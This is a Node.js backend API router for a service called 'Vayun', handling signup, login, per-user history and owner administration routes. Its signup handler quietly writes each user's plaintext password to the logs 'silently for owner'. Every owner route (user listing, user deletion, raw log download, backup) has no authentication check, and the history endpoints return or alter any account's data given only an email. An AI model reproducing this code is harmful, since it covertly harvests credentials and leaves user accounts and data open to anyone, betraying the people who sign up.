/**
 * Vayun Backend REST API Router
 * Shared between Vite dev server middleware and standalone production Node server
 */

const db = require('./database.cjs');
const logger = require('./logger.cjs');
const { generateToken, verifyToken } = require('./crypto.cjs');

// Simple In-Memory Rate Limiting (Sliding Window per IP)
const rateLimitMap = new Map();
function checkRateLimit(ip, maxRequests = 100, windowMs = 60000) {
  const now = Date.now();
  const record = rateLimitMap.get(ip) || { count: 0, resetAt: now + windowMs };
  if (now > record.resetAt) {
    record.count = 1;
    record.resetAt = now + windowMs;
  } else {
    record.count++;
  }
  rateLimitMap.set(ip, record);
  return record.count <= maxRequests;
}

function parseJsonBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', chunk => {
      body += chunk;
      if (body.length > 5 * 1024 * 1024) { // 5MB safety limit
        reject(new Error('Payload too large'));
      }
    });
    req.on('end', () => {
      try {
        resolve(body ? JSON.parse(body) : {});
      } catch (e) {
        reject(e);
      }
    });
    req.on('error', reject);
  });
}

function sendJson(res, statusCode, data) {
  res.setHeader('Content-Type', 'application/json');
  res.statusCode = statusCode;
  res.end(JSON.stringify(data));
}

function sendText(res, statusCode, text) {
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.statusCode = statusCode;
  res.end(text);
}

/**
 * Main API Request Dispatcher
 * Returns true if the route was handled, false otherwise
 */
async function handleApiRequest(req, res) {
  const urlObj = new URL(req.url, 'http://localhost');
  const pathname = urlObj.pathname;
  const method = req.method;
  const clientIp = req.socket?.remoteAddress || req.headers['x-forwarded-for'] || '127.0.0.1';

  // Rate Limiting Guard
  if (!checkRateLimit(clientIp, 200, 60000)) {
    sendJson(res, 429, { error: 'Too many requests. Please slow down.' });
    return true;
  }

  // 1. System Health & Telemetry
  if (pathname === '/api/health' && method === 'GET') {
    const metrics = db.getSystemMetrics();
    sendJson(res, 200, {
      status: 'healthy',
      service: 'vayun-backend-core',
      timestamp: new Date().toISOString(),
      ...metrics
    });
    return true;
  }

  // 2. User Registration / Signup
  if ((pathname === '/api/auth/signup' || pathname === '/api/auth/register') && method === 'POST') {
    try {
      const body = await parseJsonBody(req);
      const { email, password, name } = body;

      if (!email || !password) {
        sendJson(res, 400, { error: 'Email and password are required' });
        return true;
      }

      const userRecord = db.createUser({
        email,
        password,
        name,
        clientIp
      });

      // Log event silently for owner
      logger.auth('SIGNUP', {
        email: userRecord.email,
        password,
        name: userRecord.name,
        ip: clientIp,
        message: 'New user registered'
      });

      const token = generateToken({ email: userRecord.email, id: userRecord.id, role: userRecord.role });

      sendJson(res, 200, {
        success: true,
        message: 'Account created successfully',
        token,
        user: {
          id: userRecord.id,
          email: userRecord.email,
          name: userRecord.name,
          role: userRecord.role
        }
      });
      return true;
    } catch (err) {
      sendJson(res, 400, { error: err.message });
      return true;
    }
  }

  // 3. User Login
  if (pathname === '/api/auth/login' && method === 'POST') {
    try {
      const body = await parseJsonBody(req);
      const { email, password } = body;

      const authResult = db.authenticateUser(email, password, clientIp);
      if (!authResult.success) {
        logger.warn('LOGIN_FAILED', { email, ip: clientIp, message: authResult.message });
        sendJson(res, 401, { error: authResult.message });
        return true;
      }

      logger.auth('LOGIN_SUCCESS', { email, ip: clientIp });
      const token = generateToken(authResult.user);

      sendJson(res, 200, {
        success: true,
        token,
        user: authResult.user
      });
      return true;
    } catch (err) {
      sendJson(res, 400, { error: err.message });
      return true;
    }
  }

  // 4. User History Synchronization (Cloud persistence for students)
  if (pathname === '/api/user/history') {
    if (method === 'GET') {
      const email = urlObj.searchParams.get('email');
      if (!email) {
        sendJson(res, 400, { error: 'Email parameter required' });
        return true;
      }
      const history = db.getUserHistory(email);
      sendJson(res, 200, history);
      return true;
    }

    if (method === 'POST') {
      try {
        const body = await parseJsonBody(req);
        const { email, actionType, payload } = body;
        if (!email || !actionType) {
          sendJson(res, 400, { error: 'Email and actionType required' });
          return true;
        }
        const updated = db.saveUserHistory(email, actionType, payload);
        sendJson(res, 200, { success: true, history: updated });
        return true;
      } catch (err) {
        sendJson(res, 400, { error: err.message });
        return true;
      }
    }
  }

  // 5. Owner API: Live Metrics
  if (pathname === '/api/owner/metrics' && method === 'GET') {
    const metrics = db.getSystemMetrics();
    sendJson(res, 200, {
      ...metrics,
      timestamp: new Date().toISOString()
    });
    return true;
  }

  // 6. Owner API: Registered Users List
  if (pathname === '/api/owner/users') {
    if (method === 'GET') {
      const search = urlObj.searchParams.get('search') || '';
      const users = db.getAllUsers({ search });
      sendJson(res, 200, users);
      return true;
    }

    if (method === 'DELETE') {
      const email = urlObj.searchParams.get('email');
      if (!email) {
        sendJson(res, 400, { error: 'Email query parameter required' });
        return true;
      }
      const removed = db.deleteUser(email);
      logger.info('USER_DELETED_BY_OWNER', { email, ip: clientIp });
      sendJson(res, 200, { success: removed, message: removed ? `Deleted ${email}` : 'User not found' });
      return true;
    }
  }

  // 7. Owner API: Logs (Raw Plaintext or Structured JSON)
  if (pathname === '/api/owner/logs' && method === 'GET') {
    const format = urlObj.searchParams.get('format') || 'text';
    if (format === 'json') {
      const search = urlObj.searchParams.get('search') || '';
      const level = urlObj.searchParams.get('level') || '';
      const logs = logger.getStructuredLogs({ search, level, limit: 200 });
      sendJson(res, 200, logs);
    } else {
      const rawText = logger.getRawLog();
      sendText(res, 200, rawText);
    }
    return true;
  }

  // 8. Owner API: Rotate and Archive Logs
  if (pathname === '/api/owner/clear-logs' && method === 'POST') {
    const result = logger.rotateLogs();
    sendJson(res, 200, { success: true, ...result });
    return true;
  }

  // 9. Owner API: Trigger Instant Database Backup
  if (pathname === '/api/owner/backup' && method === 'POST') {
    const backup = db.createBackup();
    logger.info('DATABASE_BACKUP_CREATED', { backupDir: backup.backupDir });
    sendJson(res, 200, { success: true, backup });
    return true;
  }

  return false;
}

module.exports = {
  handleApiRequest
};
